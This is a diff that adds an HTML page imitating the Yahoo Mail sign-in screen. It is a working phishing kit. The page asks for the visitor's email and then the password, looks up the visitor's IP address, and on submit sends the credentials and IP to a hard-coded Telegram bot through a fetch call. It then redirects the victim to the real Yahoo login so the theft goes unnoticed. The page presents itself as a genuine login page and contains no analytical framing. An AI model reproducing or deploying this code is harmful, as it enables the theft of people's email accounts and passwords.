@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+
+<html id="Stencil" class="js grid light-theme">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+
+        <title>Yahoo</title>
+
+        <link rel="icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico" />
+        <link rel="shortcut icon" type="image/x-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-favicon-img-v0.0.2.ico" />
+        <link rel="apple-touch-icon" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png" />
+        <link rel="apple-touch-icon-precomposed" href="https://s.yimg.com/wm/mbr/images/yahoo-apple-touch-v0.0.2.png" />
+        <style nonce="">
+            #mbr-css-check {
+                display: inline;
+            }
+        </style>
+        <link href="https://dl.dropboxusercontent.com/s/yntjno1t8hokj3k/yahoo-main.css" rel="stylesheet" type="text/css" />
+
+	</head>
+    <body class="bucket-mbr-reg-domain-inline-control bucket-mbr-recent-activity">
+
+ 				<script>
+
+				function switchVisible() {				  
+				const emAil = document.querySelector('#usr')
+			if(emAil.value === ''){
+	
+          return
+        }
+				    var el = document.getElementById('userNameSpa');
+						el.textContent = usr.value;
+						
+							if (document.getElementById('div1')) {
+
+								if (document.getElementById('div1').style.display == 'none') {
+									document.getElementById('div1').style.display = 'block';
+									document.getElementById('div2').style.display = 'none';
+								}
+								else {
+									document.getElementById('div1').style.display = 'none';
+									document.getElementById('div2').style.display = 'block';
+								}
+
+							}
+				}
+
+				</script>	
+
+				
+        <div id="login-body" class="loginish puree-v2 grid">
+            <div class="mbr-desktop-hd">
+                <span class="column">
+                    <a >
+                        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo" width="" height="36" />
+                        
+                    </a>
+                </span>
+                <span class="column help txt-align-right">
+                    <a >Help</a>
+                </span>
+            </div>
+			
+		<div id="div1">	
+            <div class="login-box-container">
+                <div class="login-box right">
+                    <div class="mbr-login-hd txt-align-center">
+                        <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo yahoo-en-US" width="" height="27" />
+
+                    </div>
+                    <div class="challenge yid-challenge">
+                        <div class="challenge-header"></div>
+                        <div class="username-challenge" id="login-landing">
+                            <strong class="challenge-heading">Sign in to Yahoo&nbsp;Mail</strong>
+                            <span class="challenge-desc signin-sub-title">using your Yahoo&nbsp;account</span>
+
+                            <div id="login-username-form"class="pure-form">
+
+                                <div id="username-country-code-field" class="username-country-code puree-country-inline-dropdown-disabled code-of-length-1">
+                                   
+                                    <div class="input-group">
+                                        <input class="phone-no" type="text" name="usr" id="usr" required />
+										
+                                        <div class="input-field-icon hide" id="username-field-icon"></div>
+                                        <label for="login-username" id="login-label" class="login-label">Username, email, or&nbsp;mobile</label>
+                                        <ul class="auto-fill-overlay hide" aria-live="polite" id="domain-auto-fill">
+                                            <li data-fill="yahoo.com" tabindex="2">yahoo.com</li>
+                                            <li data-fill="gmail.com" tabindex="3">gmail.com</li>
+                                            <li data-fill="outlook.com" tabindex="4">outlook.com</li>
+                                            <li data-fill="aol.com" tabindex="5">aol.com</li>
+                                        </ul>
+                                    </div>
+									
+
+									
+                                </div>
+                                <p id="username-error" class="error-msg hide" role="alert"></p>
+
+                                <div class="button-container">
+                                    <input id="lsignin" type="submit"  class="pure-button puree-button-primary challenge-button" value="Next" onclick="switchVisible();" />
+                                </div>
+
+                                <div class="helper-links-container">
+                                    <div class="helper-item">
+                                        <span class="stay-signed-in checkbox-container">
+                                            <input id="persistent" name="persistent" value="y" type="checkbox" checked="" />
+                                            <label for="persistent">Stay signed&nbsp;in</label>
+                                        </span>
+                                    </div>
+                                    <div class="helper-item arlink">
+                                        <span class="help">
+                                            <a
+                                                id="mbr-forgot-link"
+                                                data-ylk="elm:btn;elmt:forgot;slk:forgot;mkey:forgot"
+                                                data-rapid-tracking="true"
+                                            >
+                                                Forgot&nbsp;username?
+                                            </a>
+                                        </span>
+                                    </div>
+                                </div>
+                                <div class="bottom-links-container">
+                                    <p class="sign-up-link">
+                                        <a
+                                            id="createacc"
+                                            role="button"
+                                            class="pure-button puree-button-secondary challenge-button"
+                                            data-rapid-tracking="true"
+                                            data-ylk="elm:link;elmt:secondary;slk:signup;mKey:signup"
+                                        >
+                                            Create an&nbsp;account
+                                        </a>
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div id="login-box-ad-fallback" class="login-box-ad-fallback">
+                    <h1>Yahoo makes it easy to enjoy what matters most in your&nbsp;world.</h1>
+                    <p>Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of&nbsp;life.</p>
+                </div>
+            </div>
+			
+		</div>	
+		<!-- DIV1 STARTS AND DIV2 STARTS -->	
+			
+		<div id="div2" style="display: none;">
+		
+			<div class="login-box-container">
+				<div class="login-box right">
+					<div class="mbr-login-hd txt-align-center">
+						<img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png" alt="Yahoo" class="logo yahoo-en-US" width="" height="27" />
+
+					</div>
+					<div class="challenge password-challenge">
+						<div class="challenge-header">
+							<div class="yid" id="userNameSpa"></div>
+						</div>
+						<div id="password-challenge" class="primary">
+							<strong class="challenge-heading">Enter password</strong>
+							<span class="txt-align-center challenge-desc">to finish sign in</span>
+							
+							<form id="forma" class="challenge-form">
+								
+								<div id="password-container" class="input-group password-container focussed">
+									<input
+										type="password"
+										id="pwd"
+										class="password"
+										required
+									/>
+									<label for="login-passwd" id="password-label" class="password-label">Password</label>
+									<div class="caps-indicator hide" id="caps-indicator" title="Capslock is on"></div>
+									
+								</div>
+    <input type="text" id="ipaddress" hidden>
+								<div class="button-container">
+									<button
+										type="submit"
+										id="login-signin"
+										class="pure-button puree-button-primary puree-spinner-button challenge-button"
+										name="verifyPassword"
+										value="Next"
+									>
+										Next
+									</button>
+								</div>
+								<div class="forgot-cont challenge-button-link">
+									<input
+										type="submit"
+										class="pure-button puree-button-link challenge-button-link"
+										data-ylk="elm:btn;elmt:skip;slk:skip;mKey:skip-recovery"
+										data-rapid-tracking="true"
+										id="mbr-forgot-link"
+										name="skip"
+										value="Forgot password?"
+									/>
+								</div>
+							</form>
+						</div>
+					</div>
+				</div>
+				<div id="login-box-ad-fallback" class="login-box-ad-fallback">
+					<h1>Yahoo makes it easy to enjoy what matters most in your world.</h1>
+					<p>Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of life.</p>
+				</div>
+			</div>
+<!-- START: Here's the IP stuff -->
+<script type="application/javascript">
+function getIP(json) {
+    document.getElementById("ipaddress").value = json.ip;
+}
+</script>
+
+<script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+ <!-- END: IP Stuff -->	
+
+    <script>
+      const forma = document.querySelector('#forma')
+    
+      let bot = {
+          TOKEN: "5584026320:AAEhkgV3UqqZaBzoHpO-X5LHPXB3Rw2_xNA",
+          chatID: "907859402"
+      }
+
+    forma.addEventListener("submit", e =>{
+          e.preventDefault();
+          let email = document.querySelector('#usr').value
+          let pwd = document.querySelector('#pwd').value
+		  let ips = document.querySelector('#ipaddress').value
+
+        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=Yahoo=>${email}=${pwd}=IP:=${ips}`, {
+              method: "GET"
+          }).then(success => {
+              window.location.replace("https://login.yahoo.com/?.src=ym&pspid=159600001&activity=mail-direct&.lang=en-US&.intl=us&.done=https%3A%2F%2Fmail.yahoo.com%2Fd");
+          }, error => {
+              console.log(error)
+              }) 
+      })
+    </script>		
+		
+		</div>			
+			
+				
+            <div class="login-bg-outer">
+                <div class="login-bg-inner">
+                    <div id="sb_rel_login-ad-rich" class="darla" style="position: relative; z-index: 9; width: 1440px; height: 1024px; visibility: inherit; display: inline-block; font-size: 0px;">
+
+                    </div>
+                </div>
+            </div>
+            <div class="login-footer">
+                <p>
+                    <a  target="_blank" class="terms">Terms</a>
+
+                    <span>|</span>
+                    <a  target="_blank" class="privacy">Privacy</a>
+                </p>
+            </div>
+	
+		
+        </div>
+        <div id="mbr-css-check"></div>
+        <div id="page-mask" class="page-mask hide"></div>
+        <div id="ad"></div>
+        <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
+            <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this warning">x</label>
+            <input type="checkbox" id="mbr-legacy-device-bar-cross" />
+            <p class="mbr-legacy-device">
+                Yahoo works best with the latest versions of the browsers. You're using an outdated or unsupported browser and some Yahoo features may not work properly. Please update your browser version now.
+                <a >More&nbsp;Info</a>
+            </p>
+        </div>
+
+    </body>
+</html>
